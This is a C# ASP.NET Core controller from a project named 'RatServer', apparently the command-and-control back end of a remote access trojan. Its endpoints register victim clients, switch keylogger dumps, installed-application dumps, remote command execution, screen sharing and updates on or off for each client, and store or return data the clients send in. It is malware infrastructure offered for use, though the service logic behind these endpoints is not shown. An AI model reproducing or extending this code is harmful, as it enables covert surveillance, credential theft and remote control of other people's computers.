using Microsoft.AspNetCore.Mvc;
using RatServer.Core.Filters;
using RatServer.Interfaces.Client;
using RatServer.Models.ViewModel.Client;
using System.Threading.Tasks;

namespace RatServer.Controllers.Client
{
    [Route("api/[controller]")]
    [ApiController]
    public class ClientController : ControllerBase
    {
        private readonly IClientService clientService;
        public ClientController(IClientService clientService)
        {
            this.clientService = clientService;
        }
        [HttpPost(nameof(InsertClient))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> InsertClient(ClientVM clientVM)
        {
            var insertedClient = await clientService.Insert(clientVM);
            return Ok(insertedClient);
        }

        [HttpGet(nameof(Register))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> Register(string clientId)
        {
            ClientVM clientVM = new ClientVM() {
                clientId = clientId,

            };
            var insertedClient = await clientService.Insert(clientVM);

            return Ok(true);
        }

        [HttpPost(nameof(DeleteClient))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> DeleteClient(string clientId)
        {
            return Ok(await clientService.Delete(clientId));
        }
        [HttpGet(nameof(Select))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> Select(string clientId)
        {
            var selectedClient = await clientService.Select(clientId);
            return Ok(selectedClient);
        }

        [HttpGet(nameof(SelectAll))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SelectAll()
        {
            var selectedClients = await clientService.SelectAll();
            return Ok(selectedClients);
        }

        [HttpGet(nameof(IfConnect))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> IfConnect(string clientId)
        {
            var selectedClient = await clientService.IfConnect(clientId);
            return Ok(selectedClient);
        }
        [HttpGet(nameof(IsRegistered))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> IsRegistered(string clientId)
        {
            var selectedClient = await clientService.IsRegistered(clientId);
            return Ok(selectedClient);
        }
        [HttpGet(nameof(IfUpdate))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> IfUpdate(string clientId)
        {
            var ifupdate = await clientService.IfUpdate(clientId);
            return Ok(ifupdate);
        }

        [HttpGet(nameof(IfInstalledAplicationDump))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> IfInstalledAplicationDump(string clientId)
        {
            var ifupdate = await clientService.IfInstalledAplicationDump(clientId);
            return Ok(ifupdate);
        }


        [HttpGet(nameof(IfKeyLogDump))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> IfKeyLogDump(string clientId)
        {
            var ifupdate = await clientService.IfKeyLogDump(clientId);
            return Ok(ifupdate);
        }


        [HttpGet(nameof(IfCMDRun))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> IfCMDRun(string clientId)
        {
            var ifupdate = await clientService.IfCMDRun(clientId);
            return Ok(ifupdate);
        }


        [HttpGet(nameof(IfScreenShare))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> IfScreenShare(string clientId)
        {
            var ifupdate = await clientService.IfScreenShare(clientId);
            return Ok(ifupdate);
        }

        [HttpGet(nameof(SetAllForNoCMDRun))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SetAllForNoCMDRun()
        {
            var selectedClient = await clientService.SetAllForNoCMDRun();
            return Ok(selectedClient);
        }

        [HttpGet(nameof(SetAllForNoConnect))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SetAllForNoConnect()
        {
            var selectedClient = await clientService.SetAllForNoConnect();
            return Ok(selectedClient);
        }

        [HttpGet(nameof(SetAllForNoInstalledAplicationDump))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SetAllForNoInstalledAplicationDump()
        {
            var selectedClient = await clientService.SetAllForNoInstalledAplicationDump();
            return Ok(selectedClient);
        }
        [HttpGet(nameof(SetAllForNoScreenShare))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SetAllForNoScreenShare()
        {
            var selectedClient = await clientService.SetAllForNoScreenShare();
            return Ok(selectedClient);
        }

        [HttpGet(nameof(SetAllForNoKeyLogDump))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SetAllForNoKeyLogDump()
        {
            var selectedClient = await clientService.SetAllForNoKeyLogDump();
            return Ok(selectedClient);
        }
        [HttpGet(nameof(SetAllForNoRegistered))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SetAllForNoRegistered()
        {
            var selectedClient = await clientService.SetAllForNoRegistered();
            return Ok(selectedClient);
        }
        [HttpGet(nameof(SetAllForNoUpdate))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SetAllForNoUpdate()
        {
            var selectedClient = await clientService.SetAllForNoUpdate();
            return Ok(selectedClient);
        }



        [HttpGet(nameof(SetForCMDRun))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SetForCMDRun(string clientId)
        {
            var selectedClient = await clientService.SetForCMDRun(clientId);
            return Ok(selectedClient);
        }


        [HttpGet(nameof(SetForConnect))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SetForConnect(string clientId)
        {
            var selectedClient = await clientService.SetForConnect(clientId);
            return Ok(selectedClient);
        }
        [HttpGet(nameof(SetForAplicationDump))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SetForAplicationDump(string clientId)
        {
            var selectedClient = await clientService.SetForApplicationDump(clientId);
            return Ok(selectedClient);
        }

        [HttpGet(nameof(SetForKeyLogDump))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SetForKeyLogDump(string clientId)
        {
            var selectedClient = await clientService.SetForKeyLogDump(clientId);
            return Ok(selectedClient);
        }

        [HttpGet(nameof(SetForScreenShare))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SetForScreenShare(string clientId)
        {
            var selectedClient = await clientService.SetForScreenShare(clientId);
            return Ok(selectedClient);
        }


        [HttpGet(nameof(SetForRegistered))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SetForRegistered(string clientId)
        {
            var selectedClient = await clientService.SetForRegistered(clientId);
            return Ok(selectedClient);
        }

        [HttpGet(nameof(SetForUpdate))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SetForUpdate(string clientId)
        {
            var selectedClient = await clientService.SetForUpdate(clientId);
            return Ok(selectedClient);
        }

        [HttpGet(nameof(SetForNoUpdate))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SetForNoUpdate(string clientId)
        {
            var selectedClient = await clientService.SetForNoUpdate(clientId);
            return Ok(selectedClient);
        }

        [HttpGet(nameof(SetForNoApplicationDump))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SetForNoApplicationDump(string clientId)
        {
            var selectedClient = await clientService.SetForNoApplicationDump(clientId);
            return Ok(selectedClient);
        }

        [HttpGet(nameof(SetForApplicationDump))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SetForApplicationDump(string clientId)
        {
            var selectedClient = await clientService.SetForApplicationDump(clientId);
            return Ok(selectedClient);
        }

        [HttpPost(nameof(RegisterValue) + "/{clientId}/{data}")]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> RegisterValue([FromRoute]string clientId,[FromRoute] string data, [FromBody] Value value)
        {
            var selectedClient = await clientService.RegisterValue(clientId,data,value.value);
            return Ok(selectedClient);
        }
        [HttpGet(nameof(GetValues) + "/{clientId}/{data}")]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> GetValues([FromRoute] string clientId, [FromRoute] string data)
        {
            var selectedClient = await clientService.GetValues(clientId,data);
            return Ok(selectedClient);
        }

    }

    public  class Value
    {
        public string value { get; set; }
    }
}

